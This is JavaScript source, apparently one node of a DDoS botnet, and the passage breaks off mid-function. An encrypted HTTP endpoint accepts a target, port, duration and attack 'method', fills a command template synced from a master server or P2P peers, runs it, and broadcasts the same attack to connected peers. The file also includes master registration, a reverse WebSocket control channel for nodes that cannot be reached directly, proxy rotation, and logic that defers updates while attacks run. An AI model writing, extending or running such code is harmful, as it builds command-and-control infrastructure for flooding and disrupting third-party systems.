import Fastify from 'fastify';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import config from './config/config.js';
import * as methodSyncModule from './modules/methodSync.js';
import createHeartbeat from './modules/heartbeat.js';
import createReverseClient from './modules/reverseClient.js';
import createProxyUpdater from './modules/proxyUpdater.js';
import ExecutorClass from './modules/executor.js';
import P2PHybridNode from './modules/p2pHybrid.js';

// ======================
// HELPER: fetchWithTimeout
// ======================
async function fetchWithTimeout(url, options = {}, timeout = 5000) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeout);

  try {
    const response = await globalThis.fetch(url, {
      ...options,
      signal: controller.signal
    });
    clearTimeout(timeoutId);
    return response;
  } catch (error) {
    clearTimeout(timeoutId);
    if (error.name === 'AbortError') {
      throw new Error(`Request timeout after ${timeout}ms`);
    }
    throw error;
  }
}

// ======================
// GLOBAL STATE
// ======================
let encryptionManager = null;
let encryptionInitialized = false;

const fastify = Fastify({ logger: false });

// ESM pengganti __dirname
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const dbDir = path.join(__dirname, 'database');
if (!fs.existsSync(dbDir)) {
  fs.mkdirSync(dbDir, { recursive: true });
  console.log(`[INIT] Created database directory: ${dbDir}`);
}

let heartbeatModule = null;
let reverseClient = null;
let proxyUpdater = null;
let p2pNode = null;
let heartbeatIntervalId = null;
let methodsSyncIntervalId = null;
let backgroundHeartbeat = null;
let backgroundWSHeartbeat = null;
let nodeMode = 'DIRECT';
let isRegistered = false;
let isReachable = false;

// ======================
// ATTACK IN PROGRESS CHECK
// ======================
/**
 * Returns true if there are currently active attack processes running.
 * Used to defer proxy updates and methods sync during active attacks
 * to ensure stability.
 */
function isAttackInProgress() {
  try {
    const count = executor.getActiveProcessesCount();
    return count > 0;
  } catch {
    return false;
  }
}

// ======================
// SHARED DATA
// ======================
const sharedData = {
  config,
  methodsConfig: {},
  executor: null,
  encryptionManager: null,
  proxyUpdater: null,
  p2pNode: null,
  nodeMode: 'DIRECT',
  isRegistered: false,
  isReachable: false,

  updateMethodsConfig(newConfig) {
    this.methodsConfig = newConfig;

    if (heartbeatModule?.updateMethodsConfig) {
      heartbeatModule.updateMethodsConfig(newConfig);
    }

    if (reverseClient?.updateMethodsConfig) {
      reverseClient.updateMethodsConfig(newConfig);
    }

    if (p2pNode) {
      p2pNode.updateMethodsConfig(newConfig);
    }

    console.log(
      `[SHARED] Methods config updated: ${Object.keys(newConfig).length} methods`
    );
  },

  getMethodsVersionHash() {
    try {
      const { calculateMethodsVersionHash } = methodSyncModule;
      return calculateMethodsVersionHash(this.methodsConfig);
    } catch {
      return 'unknown';
    }
  },

  setNodeMode(mode) {
    this.nodeMode = mode;
  },

  setRegistered(status) {
    this.isRegistered = status;
  },

  setReachable(status) {
    this.isReachable = status;
  },

  setProxyUpdater(updater) {
    this.proxyUpdater = updater;
  },

  setEncryptionManager(manager) {
    this.encryptionManager = manager;
  },

  setP2PNode(node) {
    this.p2pNode = node;
  }
};

// ======================
// METHODS CONFIG
// ======================
function refreshMethodsConfig() {
  try {
    const methodsWithPaths = methodSyncModule.getMethodsWithAbsolutePaths(config);
    sharedData.updateMethodsConfig(methodsWithPaths);

    console.log(
      `[METHODS-REFRESH] Methods updated: ${Object.keys(methodsWithPaths).length} methods`
    );
    return methodsWithPaths;
  } catch (e) {
    console.error('[METHODS-REFRESH] Gagal load methods config:', e.message);
    return sharedData.methodsConfig;
  }
}

// ======================
// EXECUTOR & ZOMBIE HANDLER
// ======================
const executor = new ExecutorClass(config);
sharedData.executor = executor;

executor.on('zombie_detected', (data) => {
  console.log(
    `[ZOMBIE] Detected ${data.count} zombie process(es) — killed: ${data.killed}, failed: ${data.failed}`
  );
  data.processes.forEach((p) => {
    console.log(
      `[ZOMBIE] Process ${p.processId} overtime: ${Math.round(
        p.overtime / 1000
      )}s`
    );
  });

  if (executor.zombieConfig?.autoKill) {
    console.log('[ZOMBIE] AutoKill handled by Executor');
  } else {
    console.log(
      '[ZOMBIE] AutoKill is disabled, manual intervention may be required'
    );
  }
});

// ======================
// ENCRYPTION INIT & MIDDLEWARE
// ======================
async function initializeEncryption() {
  if (config.ENCRYPTION && config.ENCRYPTION.ENABLED) {
    try {
      const { default: EncryptionManager } = await import(
        './modules/encryption.js'
      );
      const encryptionConfig = {
        ...config,
        ENCRYPTION: {
          ...config.ENCRYPTION,
          NODE_ID: config.NODE.ID
        }
      };
      encryptionManager = new EncryptionManager(encryptionConfig);
      encryptionInitialized = true;
      console.log('[INIT] Encryption system loaded');
      return true;
    } catch (error) {
      console.error('[INIT] Failed to load encryption:', error.message);
      if (!config.ENCRYPTION) config.ENCRYPTION = {};
      config.ENCRYPTION.ENABLED = false;
      encryptionInitialized = false;
      return false;
    }
  } else {
    console.log('[INIT] Encryption disabled by config');
    encryptionInitialized = false;
    return false;
  }
}

const encryptionDecorator = async (request, reply) => {
  try {
    if (!request.body || Object.keys(request.body).length === 0) {
      return;
    }

    if (
      request.body.envelope === 'secure' &&
      encryptionManager &&
      encryptionInitialized &&
      config.ENCRYPTION?.ENABLED
    ) {
      const result = encryptionManager.processSecureMessage(request.body);
      if (result.success) {
        request.body = result.data;
        request.encrypted = true;
        request.encryptionMetadata = result.metadata;
      } else {
        console.log('[MIDDLEWARE] Failed to decrypt:', result.error);

        reply.code(401).send({
          status: 'error',
          error: 'Failed to decrypt secure request',
          reason: result.error || 'INVALID_ENCRYPTION'
        });
        throw new Error('ENCRYPTION_DECRYPT_FAILED');
      }
    } else if (request.body.envelope === 'plain') {
      request.body = request.body.payload;
      request.encrypted = false;
    } else {
      request.encrypted = false;
    }
  } catch (error) {
    if (error.message === 'ENCRYPTION_DECRYPT_FAILED') {
      return;
    }
    console.error('[MIDDLEWARE] Encryption middleware error:', error.message);
    request.body = {};
    request.encrypted = false;
  }
};

function sendEncryptedResponse(reply, data, messageType = 'response') {
  if (encryptionManager && encryptionInitialized && config.ENCRYPTION?.ENABLED) {
    const encrypted = encryptionManager.createSecureMessage(data, messageType);
    reply.send(encrypted);
  } else {
    reply.send(data);
  }
}

// ======================
// VALIDATION & UTILS
// ======================
function buildCommand(template, params) {
  let cmd = template;
  for (const [key, value] of Object.entries(params)) {
    cmd = cmd.replaceAll(`{${key}}`, String(value));
  }
  return cmd;
}

function validateInput(target, time, reqPort, methods) {
  const errors = [];

  if (!target || !time || !methods) {
    errors.push(config.MESSAGES.REQUIRED_FIELDS);
  }

  if (!sharedData.methodsConfig[methods]) {
    errors.push(config.MESSAGES.INVALID_METHOD);
  }

  const timeNum = Number(time);
  if (!Number.isInteger(timeNum) || timeNum <= 0) {
    errors.push(config.MESSAGES.INVALID_TIME);
  }

  let portNum = reqPort ? Number(reqPort) : config.DEFAULTS.PORT;
  if (
    !Number.isInteger(portNum) ||
    portNum < config.DEFAULTS.PORT_MIN ||
    portNum > config.DEFAULTS.PORT_MAX
  ) {
    errors.push(config.MESSAGES.INVALID_PORT);
  }

  return {
    isValid: errors.length === 0,
    errors,
    validatedData: {
      target,
      time: timeNum,
      port: portNum,
      methods
    }
  };
}

async function fetchServerInfo() {
  try {
    const res = await fetchWithTimeout('https://httpbin.org/get', {}, 5000);
    const data = await res.json();
    console.log(`Server up: http://${data.origin}:${config.SERVER.PORT}`);
  } catch {
    console.log(`Server up on port ${config.SERVER.PORT}`);
  }
}

// ======================
// IP DETECTION & REACHABILITY
// ======================
async function detectPublicIP() {
  try {
    console.log('[IP-DETECT] Mendeteksi IP publik...');

    const services = [
      'https://httpbin.org/ip',
      'https://api.ipify.org?format=json',
      'https://ipinfo.io/json',
      'https://ifconfig.me/all.json'
    ];

    for (const service of services) {
      try {
        const res = await fetchWithTimeout(service, {}, 5000);
        if (!res.ok) continue;

        const data = await res.json();
        let ip = null;

        if (service.includes('httpbin')) {
          ip = data.origin;
        } else if (service.includes('ipify')) {
          ip = data.ip;
        } else if (service.includes('ipinfo')) {
          ip = data.ip;
        } else if (service.includes('ifconfig')) {
          ip = data.ip_addr;
        }

        if (ip) {
          if (typeof ip === 'string' && ip.includes(',')) {
            ip = ip.split(',')[0].trim();
          }

          console.log(`[IP-DETECT] IP publik terdeteksi (${service}): ${ip}`);
          return ip;
        }
      } catch (err) {
        console.log(`[IP-DETECT] Service ${service} gagal: ${err.message}`);
        continue;
      }
    }

    console.log(
      '[IP-DETECT] Semua service gagal, tidak dapat deteksi IP publik'
    );
    return null;
  } catch (err) {
    console.log('[IP-DETECT] Gagal deteksi IP publik:', err.message || err);
    return null;
  }
}

async function checkNodeReachability(ip, port) {
  if (!config.MASTER?.URL) {
    console.log('[REACHABILITY] MASTER_URL not configured');
    return { reachable: false, reason: 'MASTER_URL not configured' };
  }

  try {
    console.log(
      `[REACHABILITY] Meminta master cek akses ke node ${ip}:${port}...`
    );

    let ipToCheck = ip || config.NODE.IP;

    if (ipToCheck === '::1') {
      ipToCheck = '127.0.0.1';
    }
    if (ipToCheck && ipToCheck.startsWith('::ffff:')) {
      ipToCheck = ipToCheck.replace('::ffff:', '');
    }

    const body = {
      node_id: config.NODE.ID,
      ip: ipToCheck,
      port: port || config.SERVER.PORT,
      health_path: '/health'
    };

    const res = await fetchWithTimeout(
      `${config.MASTER.URL}/check-node-reachability`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
      },
      15000
    );

    if (!res.ok) {
      const text = await res.text();
      console.error(
        '[REACHABILITY] Master balas error:',
        res.status,
        text
      );
      return {
        reachable: false,
        reason: `master error ${res.status}`
      };
    }

    const data = await res.json();
    console.log('[REACHABILITY] Hasil dari master:', data);

    return {
      reachable: !!data.reachable,
      reason: data.reason || 'No reason provided',
      master_response: data
    };
  } catch (err) {
    console.error('[REACHABILITY] Error cek ke master:', err.message || err);
    return { reachable: false, reason: err.message || String(err) };
  }
}

async function determineNetworkMode() {
  console.log('[INIT] Determining network mode...');

  const publicIp = await detectPublicIP();

  if (!publicIp) {
    console.log('[INIT] No public IP detected, using REVERSE mode');
    return {
      mode: 'REVERSE',
      ip: null,
      reachable: false,
      reason: 'no-public-ip'
    };
  }

  config.NODE.IP = publicIp;
  console.log(`[INIT] Public IP detected: ${publicIp}`);

  console.log(
    `[INIT] Checking if master can reach ${publicIp}:${config.SERVER.PORT}...`
  );
  const reachability = await checkNodeReachability(
    publicIp,
    config.SERVER.PORT
  );

  isReachable = reachability.reachable;
  sharedData.setReachable(isReachable);

  if (reachability.reachable) {
    console.log(
      '[INIT] ✓ Node is reachable from master, using DIRECT mode'
    );
    return {
      mode: 'DIRECT',
      ip: publicIp,
      reachable: true,
      reason: reachability.reason
    };
  } else {
    console.log(
      '[INIT] ✗ Node is NOT reachable from master, using REVERSE mode'
    );
    console.log(`[INIT] Reason: ${reachability.reason}`);

    if (config.MASTER?.WS_URL) {
      console.log('[INIT] WebSocket URL available for reverse mode');
    } else {
      console.log(
        '[INIT] WARNING: WebSocket URL not configured, reverse mode may not work'
      );
    }

    return {
      mode: 'REVERSE',
      ip: publicIp,
      reachable: false,
      reason: reachability.reason
    };
  }
}

// ======================
// METHODS SYNC (P2P + MASTER)
// ======================
async function syncMethods() {
  // ── ATTACK GUARD ──────────────────────────────────────────────────────────
  if (isAttackInProgress()) {
    const activeCount = executor.getActiveProcessesCount();
    console.log(
      `[SYNC] ⚠ Skipped — ${activeCount} active attack process(es) running. ` +
      `Sync will resume after attack completes.`
    );
    return { success: false, skipped: true, reason: 'attack_in_progress', activeProcesses: activeCount };
  }
  // ─────────────────────────────────────────────────────────────────────────

  try {
    // Prefer P2P sync jika ada peers
    if (
      p2pNode &&
      p2pNode.peers.size > 0 &&
      p2pNode.p2pConfig.preferP2PSync
    ) {
      console.log('[SYNC] Attempting P2P method sync...');
      const p2pResult = await p2pNode.syncMethodsFromPeers();

      if (p2pResult && p2pResult.success) {
        console.log('[SYNC] ✓ Methods synced from P2P peers');
        p2pNode.stats.lastMethodSync = Date.now();

        setImmediate(() => {
          const propagated = p2pNode.propagateMethodsUpdateImmediate();
          console.log(
            `[SYNC] ✓ Propagated to ${propagated} peer(s) immediately`
          );
        });

        return p2pResult;
      } else {
        console.log(
          '[SYNC] P2P sync not available or not newer, falling back to master'
        );
      }
    }

    // Fallback ke master sync
    const { syncMethodsWithMaster } = methodSyncModule;
    const result = await syncMethodsWithMaster(config);

    if (result && result.success && !result.up_to_date) {
      // Update local config
      refreshMethodsConfig();

      // Propagate ke peers
      if (p2pNode && p2pNode.peers.size > 0) {
        console.log(
          '[SYNC] Propagating methods update to P2P peers IMMEDIATELY...'
        );

        p2pNode.updateMethodsConfig(sharedData.methodsConfig);

        setImmediate(() => {
          const propagated = p2pNode.propagateMethodsUpdateImmediate();
          console.log(
            `[SYNC] ✓ Propagated to ${propagated} peer(s) with ZERO delay`
          );
        });

        p2pNode.stats.methodSyncsToMaster++;
      }
    }

    return result;
  } catch (error) {
    console.error('[SYNC] Error sync methods:', error.message);
    return null;
  }
}

async function forceImmediatePropagation() {
  if (!p2pNode || p2pNode.peers.size === 0) {
    console.log('[FORCE-PROPAGATE] No P2P peers to propagate to');
    return 0;
  }

  console.log(
    '[FORCE-PROPAGATE] Forcing immediate propagation to all peers...'
  );

  p2pNode.updateMethodsConfig(sharedData.methodsConfig);

  const propagated = p2pNode.propagateMethodsUpdateImmediate();

  console.log(
    `[FORCE-PROPAGATE] ✓ Propagated to ${propagated} peer(s) immediately`
  );

  return propagated;
}

// ======================
// API ROUTES
// ======================
fastify.post(
  '/nz-sec',
  {
    preHandler: encryptionDecorator
  },
  async (request, reply) => {
    try {
      const { target, time, port: reqPort, methods } = request.body;

      const validation = validateInput(target, time, reqPort, methods);
      if (!validation.isValid) {
        return sendEncryptedResponse(
          reply,
          {
            status: 'error',
            error: validation.errors.join(', ')
          },
          'error'
        );
      }

      const {
        target: validatedTarget,
        time: validatedTime,
        port: validatedPort,
        methods: validatedMethods
      } = validation.validatedData;

      const methodCfg = sharedData.methodsConfig[validatedMethods];
      if (!methodCfg?.cmd) {
        return sendEncryptedResponse(
          reply,
          {
            status: 'error',
            error: config.MESSAGES.INVALID_METHOD
          },
          'error'
        );
      }

      const command = buildCommand(methodCfg.cmd, {
        target: validatedTarget,
        time: validatedTime,
        port: validatedPort
      });

      // 1) Execute attack locally
      const localResult = await executor.execute(command, {
        expectedDuration: validatedTime
      });

      console.log('[SECURE-EXEC SUCCESS]', {
        command: command.substring(0, 100) + '...',
        processId: localResult.processId,
        pid: localResult.pid
      });

      // 2) Broadcast to P2P peers (async)
      let p2pSummary = null;

      if (
        p2pNode &&
        p2pNode.p2pConfig.enabled &&
        p2pNode.peers.size > 0
      ) {
        console.log(
          `[SECURE-EXEC] Broadcasting attack to ${p2pNode.peers.size} P2P peer(s)...`
        );

        try {
          const p2pPromise = p2pNode.broadcastAttackRequest({
            target: validatedTarget,
            time: validatedTime,
            port: validatedPort,
            methods: validatedMethods,
            maxParallel: 10
          });

          p2pPromise
            .then((result) => {
              console.log(
                '[SECURE-EXEC] P2P broadcast completed:',
                result.summary
              );
            })
            .catch((error) => {
              console.error(
                '[SECURE-EXEC] P2P broadcast error:',
                error.message
              );
            });

          p2pSummary = {
            success: true,
            summary: {
              totalTargets: p2pNode.peers.size,
              initiated: true
            },
            async: true
          };
        } catch (error) {
          console.error(
            '[SECURE-EXEC] P2P broadcast error:',
            error.message
          );
          p2pSummary = {
            success: false,
            error: error.message
          };
        }
      } else {
        console.log(
          '[SECURE-EXEC] P2P not available or no peers, skip broadcast'
        );
      }

      // 3) Send response
      sendEncryptedResponse(
        reply,
        {
          status: 'ok',
          target: validatedTarget,
          time: validatedTime,
          port: validatedPort,
          methods: validatedMethods,
          processId: localResult.processId,
          pid: localResult.pid,
          message: config.MESSAGES.EXEC_SUCCESS,
          encrypted: request.encrypted || false,
          p2p: p2pNode
            ? {
                enabled: p2pNode.p2pConfig.enabled,
                peers_connected: p2pNode.peers.size,
                broadcast: p2pSummary
              }
            : {
                enabled: false
              }
        },
        'attack_response'
      );
    } catch (error) {
      console.error('[SECURE-EXEC ERROR]', error);

      sendEncryptedResponse(
        reply,
        {
          status: 'error',
          error: config.MESSAGES.EXEC_ERROR,
          details: error.error || error.message,
          encrypted: request.encrypted || false
        },
        'error'
      );
    }
  }
);

fastify.post(
  '/heartbeat-sec',
  {
    preHandler: encryptionDecorator
  },
  async (request, reply) => {
    try {
      if (!heartbeatModule) {
        return sendEncryptedResponse(
          reply,
          {
            status: 'error',
            error: 'Heartbeat module not initialized'
          },
          'error'
        );
      }

      const heartbeatData = await heartbeatModule.getSimpleStatus();

      sendEncryptedResponse(
        reply,
        {
          status: 'ok',
          data: heartbeatData,
          received_encrypted: request.encrypted || false
        },
        'heartbeat_response'
      );
    } catch (error) {
      console.error('[SECURE-HEARTBEAT ERROR]', error);
      sendEncryptedResponse(
        reply,
        {
          status: 'error',
          error: 'Failed to generate heartbeat',
          details: error.message
        },
        'error'
      );
    }
  }
);

fastify.get('/process/kill/:id', async (request, reply) => {
  const processId = parseInt(request.params.id, 10);

  if (Number.isNaN(processId)) {
    return reply.status(400).send({
      status: 'error',
      error: 'Invalid process ID'
    });
  }

  const killed = executor.killProcess(processId);

  if (killed) {
    reply.send({
      status: 'ok',
      message: `Process ${processId} killed successfully`
    });
  } else {
    reply.status(404).send({
      status: 'error',
      error: `Process ${processId} not found`
    });
  }
});

fastify.get('/process/kill-all', async (request, reply) => {
  const killed = executor.killAllProcesses();

  reply.send({
    status: 'ok',
    message: `Killed ${killed} processes`
  });
});

fastify.get('/health', async (request, reply) => {
  reply.send({
    status: 'ok',
    node_id: config.NODE.ID,
    timestamp: new Date().toISOString(),
    encryption: encryptionInitialized && !!config.ENCRYPTION?.ENABLED,
    mode: nodeMode,
    reachable: isReachable,
    registered: isRegistered,
    methods_count: Object.keys(sharedData.methodsConfig).length,
    ip: config.NODE.IP || 'unknown',
    port: config.SERVER.PORT,
    p2p_enabled: config.P2P?.ENABLED || false,
    p2p_peers: p2pNode ? p2pNode.peers.size : 0,
    active_processes: executor.getActiveProcessesCount(),
    attack_in_progress: isAttackInProgress()
  });
});

// P2P Status Endpoint
fastify.get('/p2p/status', async (request, reply) => {
  if (!p2pNode) {
    return reply.send({
      enabled: false,
      message: 'P2P is not initialized'
    });
  }

  reply.send(p2pNode.getStatus());
});

// P2P Connect to Peer Endpoint
fastify.post('/p2p/connect', async (request, reply) => {
  if (!p2pNode) {
    return reply.status(503).send({
      status: 'error',
      error: 'P2P is not initialized'
    });
  }

  const { nodeId, ip, port } = request.body || {};

  if (!nodeId || !ip || !port) {
    return reply.status(400).send({
      status: 'error',
      error: 'Missing nodeId, ip, or port'
    });
  }

  const result = await p2pNode.connectToPeer(nodeId, { ip, port });

  reply.send({
    status: result.success ? 'ok' : 'error',
    ...result
  });
});

// P2P Method Sync Endpoint
fastify.post('/p2p/sync-methods', async (request, reply) => {
  if (!p2pNode) {
    return reply.status(503).send({
      status: 'error',
      error: 'P2P is not initialized'
    });
  }

  // Allow manual sync via API even during attack (operator decision)
  const result = await p2pNode.syncMethodsFromPeers();

  reply.send({
    status: result.success !== false ? 'ok' : 'error',
    ...result
  });
});

fastify.post('/p2p/propagate-methods', async (request, reply) => {
  if (!p2pNode) {
    return reply.status(503).send({
      status: 'error',
      error: 'P2P is not initialized'
    });
  }

  try {
    const propagated = await forceImmediatePropagation();

    reply.send({
      status: 'ok',
      message: 'Methods propagated immediately',
      peers_notified: propagated,
      methods_count: Object.keys(sharedData.methodsConfig).length,
      methods_version: sharedData.getMethodsVersionHash().substring(0, 8),
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    reply.status(500).send({
      status: 'error',
      error: error.message
    });
  }
});

// ======================
// INITIALIZATION HELPERS
// ======================
async function initializeModules() {
  console.log('[INIT] Initializing modules...');

  if (!sharedData.executor) {
    sharedData.executor = executor;
  }

  await initializeEncryption();
  sharedData.setEncryptionManager(encryptionManager);

  if (!heartbeatModule) {
    heartbeatModule = await createHeartbeat(
      config,
      executor,
      sharedData.methodsConfig
    );
    console.log('[INIT] Heartbeat module created');
  }

  if (config.MASTER?.URL) {
    try {
      console.log('[INIT] Testing connection to master...');
      const testResponse = await fetchWithTimeout(
        config.MASTER.URL + '/api/status',
        {},
        5000
      );
      if (testResponse.ok) {
        console.log('[INIT] ✓ Master server is reachable');
        return true;
      } else {
        console.log(
          '[INIT] ✗ Master server responded with error:',
          testResponse.status
        );
        return false;
      }
    } catch (error) {
      console.log(
        '[INIT] ✗ Cannot reach master server:',
        error.message
      );
      return false;
    }
  } else {
    console.log('[INIT] MASTER_URL not configured');
    return false;
  }
}

// ======================
// MODE-BASED OPERATIONS
// ======================
function startModeBasedOperations(heartbeatInterval, methodsSyncInterval) {
  console.log(`[INIT] Starting operations for ${nodeMode} mode...`);

  if (nodeMode === 'DIRECT') {
    startDirectMode(heartbeatInterval, methodsSyncInterval);
  } else if (nodeMode === 'REVERSE') {
    startReverseMode(heartbeatInterval, methodsSyncInterval);
  } else {
    startStandaloneMode();
  }
}

function startDirectMode(heartbeatInterval, methodsSyncInterval) {
  console.log('[INIT] Starting DIRECT mode operations...');
  console.log(
    '[INIT] ⏳ Waiting for successful registration before starting other services...'
  );

  setTimeout(async () => {
    try {
      if (!heartbeatModule) {
        console.error('[INIT] ✗ Heartbeat module not initialized!');
        return;
      }

      if (
        typeof heartbeatModule !== 'object' ||
        typeof heartbeatModule.autoRegister !== 'function'
      ) {
        console.error(
          '[INIT] ✗ Heartbeat module is invalid!',
          typeof heartbeatModule
        );
        console.error(
          '[INIT] Available keys:',
          Object.keys(heartbeatModule || {})
        );
        return;
      }

      console.log(
        '[INIT] 🔄 Attempting registration to master (DIRECT mode)...'
      );

      const registerResult = await heartbeatModule.autoRegister();

      if (registerResult.success) {
        console.log('='.repeat(80));
        console.log('[INIT] ✅ REGISTRATION SUCCESSFUL (DIRECT mode)');
        console.log('='.repeat(80));
        isRegistered = true;
        sharedData.setRegistered(true);

        console.log(
          '\n[POST-REGISTRATION] Starting post-registration services...\n'
        );

        // 1. Start heartbeat service
        console.log(
          '[POST-REGISTRATION] 1/5 Starting heartbeat service...'
        );
        startHeartbeatService(heartbeatInterval);
        console.log('[POST-REGISTRATION] ✓ Heartbeat service started');

        // 2. Initial methods sync
        console.log(
          '\n[POST-REGISTRATION] 2/5 Performing initial methods sync...'
        );
        setTimeout(async () => {
          try {
            const syncResult = await syncMethods();
            if (syncResult && syncResult.success) {
              console.log(
                '[POST-REGISTRATION] ✓ Initial methods sync completed'
              );
              console.log(
                `[POST-REGISTRATION] Methods count: ${Object.keys(
                  sharedData.methodsConfig
                ).length}`
              );
              refreshMethodsConfig();

              if (p2pNode) {
                p2pNode.updateMethodsConfig(sharedData.methodsConfig);
                console.log(
                  '[POST-REGISTRATION] ✓ P2P node updated with latest methods'
                );
              }
            } else if (syncResult?.skipped) {
              console.log(
                '[POST-REGISTRATION] ⚠ Initial methods sync skipped (attack in progress), will retry periodically'
              );
            } else {
              console.log(
                '[POST-REGISTRATION] ⚠ Initial methods sync failed or up-to-date, will retry periodically'
              );
            }
          } catch (error) {
            console.error(
              '[POST-REGISTRATION] ✗ Initial methods sync error:',
              error.message
            );
          }
        }, 2000);

        // 3. Start proxy updater (if enabled)
        if (config.PROXY?.AUTO_UPDATE) {
          console.log(
            '\n[POST-REGISTRATION] 3/5 Starting proxy auto-updater...'
          );
          setTimeout(() => {
            if (!proxyUpdater) {
              console.log(
                '[POST-REGISTRATION] ⚠ Proxy updater not initialized, skipping'
              );
              return;
            }

            const interval =
              config.PROXY.UPDATE_INTERVAL_MINUTES || 10;
            proxyUpdater.startAutoUpdate(interval, executor);
            console.log(
              `[POST-REGISTRATION] ✓ Proxy auto-update started (every ${interval} minutes)`
            );
          }, 3000);
        } else {
          console.log(
            '\n[POST-REGISTRATION] 3/5 Proxy auto-updater disabled'
          );
        }

        // 4. P2P info
        if (p2pNode?.p2pConfig.enabled) {
          console.log(
            '\n[POST-REGISTRATION] 4/5 P2P services already running...'
          );
          setTimeout(() => {
            console.log(
              `[POST-REGISTRATION] ✓ P2P Status: ${p2pNode.peers.size} peers connected`
            );
          }, 4000);
        } else {
          console.log(
            '\n[POST-REGISTRATION] 4/5 P2P disabled or not initialized'
          );
        }

        // 5. Periodic sync
        console.log(
          '\n[POST-REGISTRATION] 5/5 Starting periodic sync...'
        );
        startPeriodicP2PSync(methodsSyncInterval);
        console.log('[POST-REGISTRATION] ✓ Periodic sync started');

        console.log('\n' + '='.repeat(80));
        console.log(
          '[POST-REGISTRATION] ✅ ALL POST-REGISTRATION SERVICES STARTED SUCCESSFULLY'
        );
        console.log('='.repeat(80));
        console.log(
          `[READY] Node ready - Mode: ${nodeMode}, Registered: ${isRegistered}, Reachable: ${isReachable}`
        );
        console.log(
          `[READY] Methods: ${Object.keys(sharedData.methodsConfig).length}, ` +
            `Encryption: ${
              config.ENCRYPTION?.ENABLED && encryptionInitialized
                ? 'ON'
                : 'OFF'
            }`
        );
        console.log(
          `[READY] P2P: ${p2pNode ? 'ENABLED' : 'DISABLED'}, ` +
            `P2P Peers: ${p2pNode ? p2pNode.peers.size : 0}`
        );
        console.log('='.repeat(80) + '\n');
      } else {
        console.log('='.repeat(80));
        console.log(
          '[INIT] ✗ REGISTRATION FAILED (DIRECT mode):',
          registerResult.error
        );
        console.log('='.repeat(80));

        if (config.MASTER?.WS_URL && config.REVERSE?.ENABLE_AUTO) {
          console.log(
            '[INIT] 🔄 Attempting fallback to REVERSE mode...\n'
          );
          nodeMode = 'REVERSE';
          sharedData.setNodeMode('REVERSE');
          startReverseMode(heartbeatInterval, methodsSyncInterval);
        } else {
          console.log(
            '[INIT] ⏳ Will retry registration in 30 seconds...\n'
          );
          setTimeout(
            () =>
              retryRegistration(heartbeatInterval, methodsSyncInterval),
            30000
          );
        }
      }
    } catch (error) {
      console.error('\n' + '='.repeat(80));
      console.error(
        '[INIT] ✗ ERROR IN DIRECT MODE STARTUP'
      );
      console.error('='.repeat(80));
      console.error('[INIT] Error:', error.message);
      console.error('[INIT] Stack trace:', error.stack);
      console.error('='.repeat(80) + '\n');

      if (config.MASTER?.WS_URL && config.REVERSE?.ENABLE_AUTO) {
        console.log(
          '[INIT] 🔄 Falling back to REVERSE mode after error...\n'
        );
        nodeMode = 'REVERSE';
        sharedData.setNodeMode('REVERSE');
        startReverseMode(heartbeatInterval, methodsSyncInterval);
      }
    }
  }, 2000);
}

function startReverseMode(heartbeatInterval, methodsSyncInterval) {
  console.log('[INIT] Starting REVERSE mode operations...');
  console.log(
    '[INIT] ⏳ Waiting for WebSocket connection and registration...'
  );

  if (!config.MASTER?.WS_URL) {
    console.log(
      '[INIT] ✗ ERROR: MASTER.WS_URL not configured for REVERSE mode'
    );
    console.log('[INIT] Falling back to STANDALONE mode');
    startStandaloneMode();
    return;
  }

  try {
    reverseClient = createReverseClient(
      config,
      executor,
      sharedData.methodsConfig
    );
  } catch (error) {
    console.error(
      '[INIT] ✗ Failed to create reverse client:',
      error.message
    );
    console.log('[INIT] Falling back to STANDALONE mode');
    startStandaloneMode();
    return;
  }

  console.log(
    '[REVERSE-INIT] 🔄 Connecting to master via WebSocket...'
  );
  reverseClient.connect();

  let connectionCheckAttempts = 0;
  const maxConnectionCheckAttempts = 30;

  const setupInterval = setInterval(async () => {
    connectionCheckAttempts++;

    if (reverseClient.isConnected && reverseClient.isConnected()) {
      clearInterval(setupInterval);
      console.log('\n' + '='.repeat(80));
      console.log('[REVERSE] ✅ WEBSOCKET CONNECTED');
      console.log('='.repeat(80));

      try {
        console.log('\n[REVERSE] 🔄 Attempting REST registration...');
        const registerResult = await reverseClient.registerWithMaster();

        if (registerResult.success) {
          console.log('='.repeat(80));
          console.log(
            '[REVERSE] ✅ REGISTRATION SUCCESSFUL (via REST)'
          );
          console.log('='.repeat(80));
          isRegistered = true;
          sharedData.setRegistered(true);

          console.log(
            '\n[POST-REGISTRATION] Starting post-registration services...\n'
          );

          // 1. WebSocket heartbeat
          console.log(
            '[POST-REGISTRATION] 1/4 Starting WebSocket heartbeat...'
          );
          if (reverseClient.startBackgroundHeartbeat) {
            backgroundWSHeartbeat =
              reverseClient.startBackgroundHeartbeat(
                heartbeatInterval
              );
            backgroundWSHeartbeat.start();
            console.log(
              `[POST-REGISTRATION] ✓ WebSocket heartbeat started (every ${heartbeatInterval}ms)`
            );
          }

          // 2. Initial methods sync
          console.log(
            '\n[POST-REGISTRATION] 2/4 Performing initial methods sync...'
          );
          setTimeout(async () => {
            try {
              const syncResult = await syncMethods();
              if (syncResult && syncResult.success) {
                console.log(
                  '[POST-REGISTRATION] ✓ Initial methods sync completed'
                );
                refreshMethodsConfig();

                if (p2pNode) {
                  p2pNode.updateMethodsConfig(sharedData.methodsConfig);
                }
              }
            } catch (error) {
              console.error(
                '[POST-REGISTRATION] ✗ Methods sync error:',
                error.message
              );
            }
          }, 2000);

          // 3. Proxy updater
          if (config.PROXY?.AUTO_UPDATE && proxyUpdater) {
            console.log(
              '\n[POST-REGISTRATION] 3/4 Starting proxy auto-updater...'
            );
            setTimeout(() => {
              const interval =
                config.PROXY.UPDATE_INTERVAL_MINUTES || 10;
              proxyUpdater.startAutoUpdate(interval, executor);
              console.log(
                '[POST-REGISTRATION] ✓ Proxy auto-update started'
              );
            }, 3000);
          }

          // 4. Periodic sync
          console.log(
            '\n[POST-REGISTRATION] 4/4 Starting periodic sync...'
          );
          startPeriodicP2PSync(methodsSyncInterval);

          console.log('\n' + '='.repeat(80));
          console.log(
            '[POST-REGISTRATION] ✅ ALL SERVICES STARTED SUCCESSFULLY (REVERSE MODE)'
          );
          console.log('='.repeat(80));
          console.log(
